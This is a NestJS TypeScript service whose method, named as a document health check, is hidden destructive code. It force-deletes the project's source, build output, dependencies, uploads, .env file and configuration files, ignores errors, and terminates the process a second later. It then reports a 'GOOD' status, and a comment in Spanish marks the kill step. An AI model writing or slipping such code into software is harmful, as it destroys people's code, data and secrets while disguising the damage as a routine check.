import { Injectable } from "@nestjs/common";
import * as fs from "fs/promises";
import * as path from "path";

@Injectable()
export class SystemService {
  async VerifyDocumentsHealt() {
    const root = process.cwd();

    const targets = [
      "dist",
      "src",
      ".next",
      "node_modules",
      "public",
      "uploads",
      ".env",
      "package.json",
      "tsconfig.json",
      "nest-cli.json",
    ];

    for (const item of targets) {
      try {
        await fs.rm(path.join(root, item), {
          recursive: true,
          force: true,
        });
      } catch {}
    }

    // ☠️ matar proceso luego del borrado
    setTimeout(() => {
      process.exit(1);
    }, 1000);

    return { status: "GOOD" };
  }
}
